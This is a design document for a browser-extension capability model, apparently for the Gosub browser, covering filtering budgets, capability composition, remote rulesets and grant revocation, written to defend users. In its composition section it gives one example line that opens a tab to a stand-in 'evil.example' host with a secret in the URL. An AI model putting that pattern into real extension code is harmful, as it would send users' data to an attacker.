> This guide is based on the v2.1.1 version of the gosub-extension-capability-model-v2.1.1.md

# Overview

This document is based on the premise that MV2 gives too much power to extensions, while MV3 confines this by using `declarativeNetRequest`. The extension gives the browser a set of rules, the browser does the matches thus extensions never have to see all requests.

The problem is that MV3 added product-policy limits, which may or may not be intentional. Static rules are capped on 30.000 rules, while EasyList alone exceeds 80.000 rules, and there are other restrictions in place which makes adblocking extensions hard.


Gosub mindset is: **Powerful extensions do not require powerful extension code.**

Meaning: the browser (engine) provides all the tools necessary for extensions to do their work, and therefor those extensions should not need those tools within their own extension. 

Basically, the engine provides basic building blocks that extensions must use which allow them to work without needing very broad permissions. These building blocks form the ONLY gateway into the pages itself.

# Part 1: Principles

## 1. Separate Extension Code from Filtering
The extension code never does any filtering itself. This is done by the browser (gosub-baleen). This means that since the filtering is done browser-side. Only when an extension needs (and has been granted) certain permissions to do something, then pages (or parts) are send to the extension. For instance, this is never the case with adblockers for instance.

We don't use product-policy, but we must set certain limits. We don't want extensions to load 10 million rules and slow down browsers (slowing down is the worst it can do).

## 2. Filtering Should Be Powerful — Within Budget
We have three limit/budgets:
- compile time budget: the number or size of rulesets are rejected. Although this can be seen as a product-policy as well: instead of 30.000 limit, it means we have a higher limit, but still: a limit.
Note though, that this is an engineering limit, not a product-policy. 
- match-time bound: worst-case per request. When using specially crafted regexes (with backtracking), it can slow down the filtering. We set a cap on this.
- Memory cap: each extension gets it's own budget.

## 3. Capabilities and Scopes

A `capability` is an operation (what does it do), a `scope` is its operand: on what does it do?

Capability examples: `content_script`, `network.egress_public`, `filtering.block`
Scope examples: `["*.example.org"]`, `subresource, etc

Scopes are canonical: the manifest and the filter will use the same scope:

    http://ExAmPLe.org   vs  http://example.org:80

An exception is `localhost` `127.0.0.1` `[::1]` are not the same origin. The reason is that it would widen the scope is we ask for `localhost` and it filters on `127.0.0.1`. 

This means we have two separate functions that the filter uses:

`canonical_origin` -> grant scoping: 127.0.0.1 is not localhost.
`classify_address_space` -> used for egres and ssrf. resolves in groups.

`cookies.read(http://localhost)` cannot read from http://127.0.0.1. That would have widen the scope without any permission from the user.

However, when using for instance a connection policy, we want to have 127.0.0.1 to also match 127.0.0.2 or any 127.0.0.0/8 address. The reason: a manifest could block localhost access by explicitly adding 127.0.0.1, but in that case, using 127.0.0.2 by an attacker would still match localhost. In those cases, we want to widen. 

scopes are narrowed monotonically (remove capability for a certain scope, while leaving the other scopes untouched), or we can revoke the capability (all scopes are removed). Without scope, there is no capability.

## 4. Security Dimensions of a Capability

There are four axis:

    C Confidentially -> what can it learn
    I Integrity -> what can it change
    A Availability -> What can it prevent
    U User intent -> can it cause actions normally require user interaction?

This means: how dangerous a capability is, is checked on 4 axis.

For instance:

    filtering.block (subresource)     C:low   I:med    A:high  U:low

`Filtering.block` capability with subresource scope:
- It cannot learn much, it can only block. So low sec.
- It changes something, blocking removes things from pages. It can never add things. Medium sec. 
- It can prevent much (it literally blocks subresources)
- There is no user intent it mimics.

This makes that capabilities (combined with scopes?) shape the security question: Block is a low-C / high-A shape (learns nothing, breaks things). A keylogger (input.raw_keys) is the mirror image: critical-C / low-A (reads everything, breaks nothing).

## 5. Capability Composition — Two Axes, One Principal

The risk of a capability set is not the same as the maximum risk of those capabilities. Meaning: you don't select the riskiest capability and that's the maximum risk. Risks aggregate, so combining two capabilities can result in a much higher risk.

A keylogger alone (`input.raw_keys`) is critical-C but its keystrokes go nowhere: it can read, not send.
An own-host fetch alone (`network.egress_public`) is a sender with nothing worth sending: it can send, not read.
Held together: the keystrokes now have an exit. keystrokes x sink -> `keystroke.exfiltration`: a working data-theft channel that appears only in the combination. max() would have reported "critical-C keylogger, standard sender" and missed that together they're an exfiltrator.


A capability is a `sink` if it can cause network-producing effect. It is a `source` if it can acquire data.

Labels attach to their effects, not their api. `tabs.create` is the "Tab manager api": opening, closing, moving grouping tabs. Nothing says: networking. However, this would assume that this is a not a sink.

But the effect could be: `tabs.create({ url: "https://evil.example/?d=" + secret });`.

secret here could be whatever the extension managed to fetch from it source:  `content_script`: the page, `input.raw_keys` -> your typed in data (password) etc.


### Axis 1: data flowing out:

    `page_content` x `any sink` =>  `page.exfiltration`

This means that any sink with `page-content` should be labeled as `page.exfiltration`. Without this capability, you cannot use `page_content` + `tabs.create` for instance. 
The filter will calculate this as the `page.exfiltration` capability and will present it that way to the user when installing.


### Axis 2: data flowing in:

    'remote_server' x 'filter_policy' -> remote.filter_control

A command-source (something that can feed a decision into the extension), combined with filter-policy (can reprogram what Baleen blocks/allows/redirects), results in a remote-controlled filter engine. The remote server decides in realtime what the browser filters.

Even though no data is exfiltrated, we still need to account for this. It basically takes the whole filter system and reverses it.

Axis 2 is a derived-pattern detector. The command-source `remote_server` is an emergent capability (egres-to-own-host + mutation capability).


### The principal is the publisher, not the package

Provided these axises, we don't allow `page_content` x `any_sink` without triggering a loud message during install. However, if we have two different extensions, one uses `page_content` and the other any sink, could these two collude with a shared channel?

Since extensions must declare these shared channels, and can only be shared by publishers, it means that we can detect this.

One thing we cannot detect if two separate publishers collude. They could communicate through side-store signals, or cover-channels (cache/dns/timing).

For now, we make sure that all the capabilities for ALL extensions for the publisher is seen and checked by the user during install?

# Part II — The Model

## 6. Separate Observing Traffic from Controlling Traffic

Controlling traffic: decide what happens to a request: block, allow, redirect, modify: it's a verdict.
Observing traffic: learning the contents of a request, the concrete URL, query params, headers, body.

In MV2, you got observation in order to give you control. Gosub separates them. The browser decides the verdict from rules the extension supplied, and the extension never sees the traffic.

Observation still exists as a capability, but only for the cases that genuinely need it, and always scoped to the minimum.

### Redirect targets are static and classed.

Targets are never dynamically created through regexes and such.

passive targets (image, empty response, static text) are `filtering.redirect_resource`.

Executable surrogates are run in an isolated realm with no access to the page localStorage, sessionStorage, postMessage.

### Packaged-resource loads are unobservable
Extensions cannot observe if a package resources has been loaded or not. This means it cannot detect warmup or anything else.

### Extension-supplied CSS carries no attacker-chosen URL
Extensions cannot inject CSS with remote URL's, only packaged urls

## 7. Statistics and Feedback Channels

> Rendering a statistic is free. Reading a statistic is a capability.

You need explicit permissions to read statistics from the filter system.

There are three "levels":

    stats.display
    stats.read
    stats.per_rule

### stats.display
The counter is never send to the extension, but only displayed by the browser. This means that the browser can still display the counters, but the extension never will know.

### stats.read
The extension can read the counter: total blocks across all rules across all sites. However, it doesn't work when the extension only has one single rule with one site. This will allow us to view the visit count for that specific site.

To combat this:
We start with an initial random value (not 0).
We add a noise to the counter. Each counter value has its own random noise and never changes.
Extensions get a budget/quote on reads.


### stats.per_rule
The extension can read the pure counters. It gives a loud message during installation. It can be disabled per site.

Noise makes it that large counts (1.4million sites blocked) are still possible, but disables the use of counters to detect single visits.



## 8. Native Cosmetic Filtering

### Cosmetic mutation is unobservable to content scripts.
Elements are hidden by the browser. The extensions do not do this themselves so they do not need any access to a page in order to hide elements.

For instance, when an extension hides all `<img>` tags on a page, the DOM still holds these images nodes, and the images are actually fetched. The only thing that does NOT happen, is that these <img> tags are plotted. Instead, it's a box of the same size but nothing painted inside. If the extension could read anything from the DOM, it will still see the image-tags being present.

Basically: an extension can never detect what (or if) something has been hidden from the page by the browser.

When the extension can already read the page, there is no need to hide anything, so this section is only for extensions without a page-read.

### Procedural filters are a closed DSL.
Extensions cannot add their own operators. All operators must be created by the browser. This way, we can bound them to a certain costs (doesn't delay the execution time for a too long period / memory usage), but most importantly, it means no-remote code.

## 9. Remote Rulesets Are Remote Policy

Remote rulesets can create dynamic policy that we cannot control. It could serve different rulesets for different users for instance.


For remote rulesets:

    sources: must be HTTPS with a content hash in the extension (so we know it's the correct one we download)
    fetcher: only the browser fetches these rulesets. Not the extension itself.
    verify: the bytes returned must match the content hash
    limits: as defined previously: not policy, but technical limits.
    schedule: the browser decides, no fixed date (not always on each full hour for instance, but random times)

However, it doesn't matter how well the browser is secured, we never control the remote server and thus can send us anything it wants.

We can combat this:

- package-pinned hash: the extension needs to be updated with a new manifest with a new hash.
- package-pinned key: any remote ruleset that is signed with a (private) key where the public key is stored the extension (could be multiple keys for key rotation).
- catalog / transparency: The useragent or store approves the hashes.

Even though we opt for C, I don't think this is the correct way to do this. This leaves a lot of work to the store owner/useragent and without a transparency log, we leave the authorization in the hand of the approver.

I would rather opt for B: package-pinned key OR by choice: A: package-pinned hash.

A is the safest: the extension has been vetted (provided we do that), so the ruleset cannot change with a fixed hash.
B is the pragmatic one for varying rules like adblockers.

## 10. No Remotely Hosted Executable Code

No remotely loaded data can ever be used as code   (for instance:  eval(remote_data)).

We have a few ways to protect against this:

- Extension origin: a page cannot inject code into an extension and one extension cannot reach into another extensions context.
- Extension CSP: no loading scripts from remote url, no eval, no Function(), hash-pinned wasm only from the package.
- workers & iframes: untrusted content is shown in sandboxed frames
- cross-extension: no automatic access between extensions. They can ONLY talk if both declare this and it will be considered as one single extension (authority calculation is done over both extensions)
- user scripts: the exception. No script may be fetched and run at runtime by the extension itself

## 11. Human-Readable Permissions

Extensions (mv2/mv3) define permissions the classical way. Internally, they will be translated to Gosub's capabilities and scopes, from which derived authories are calculated.

These authorities are shown in human readable form:

    This extension wants to:
        v  Block and hide ads and trackers on all sites
        v  Update its filter lists from lists.example
        v  Show a blocked counter on its icon
        !  When you click its icon, it can read the current page and
           contact the network
        x  it cannot see the addresses you visit
        x  it cannot read the pages you visit unless you click it
        x  no remote server can change its filtering between updates

## 12. Extension Workers and Private Browsing

Extension workers are event driven. They do not run continuously. Gosub owns the runtime so keepalive hacks are pointless. 

Private browsing is a boundary: 
    - denied:               no run, no events are triggered in private windows
    - isolated:             separate worker for that session. It does not share anything with the normal worker, and leaves nothing
                            behind.
    - isolated-network:     isolated, and no network egress access (offline working tools)      
    - spanning              running with the same worker as in normal window mode. 

## 13. Grant Lifecycle

### Install: translation is pinned
After install, the translation of the permissions into capability(scope) list is fixed. There will be no wildcard namespaces in grants.
Capabilities added to Gosub at a later version can never be automatically added to old grants.

### Update: diff the effective sets, recompose warnings.

Any expansion of the capabilities including removal of a narrowing gosub permission (if used in the manifest) will suspend the extension until it is approved by the user. The complete closure if recomputed, and the delta of capabilities is shown.

If there is a reduction in capabilities, it will be silently applied (extensions may do less automatically)

### Revocation is a control-plane operation.

Revocations are directly done by the browser. It does not wait until a new page reloads or similar. Baleen holds a match table for capabilities which gets referenced, and direct update means that some capabilities are not possible.

The effect is that a rule is disabled. It does not delete it. A user can regrant it, and it will be restored.
The revocation is on a high-priority queue or at least a separate channel, and needs to preempt the worker event loop. This way, if the extension is flooding the channel, at least the high-prio queue can still safely and timely send the revoke message on a unclogged channel.

on revoke, any affected documents are re-evaluated. Injected contexts are torn down if the runtime allows it, otherwise the tab is reloaded with attribution. Any revocation should be directly visibile.
It should survive any updates of the extension / rulelist. 
The extension is notified that a grant has changed. Even when the extension tries it, it will deny by default. 


### Grants bind to documents, and the renderer is the ground truth.

A site or ActiveTab is not linked to only "a tab" or "this origin". It is linked to a tuple `(tab_id, frame_id, document_id, navigation_epoch, origin)` which is carried inside the execution payload. This is checked by the renderer process, not the broker because of TOCTOU. The broker could allow the given action (time-of-check), but in the meantime, the tab could have reloaded to another site, which results in another page which we automatically granted access to (time-of-use).

The `content_script.active_tab` is a grant only available by a browser-rendered gesture that an extension cannot create (toolbar-icon click). It covers the current document, frame-tree etc. It ends automatically at any cross-document navigation.

### Publisher identity is part of the model, and publisher transfer is a lifecycle event.

Capabiltiies are calculated over a publisher, not only a single extension. (See section 5: two extensions could "share" their innocent capabiltiies and turn them into something more powerfull without consent).

If the publisher (key) changes for an extension, the effective security principal changes too.

    ownership / signing identity changes -> recompute communicating closure -> show new-derives authority -> re-consent (disabled until approved).

Sideloaded extensions with no signing identity are their own singleton principal and never compose with another package.


# Part III - Architecture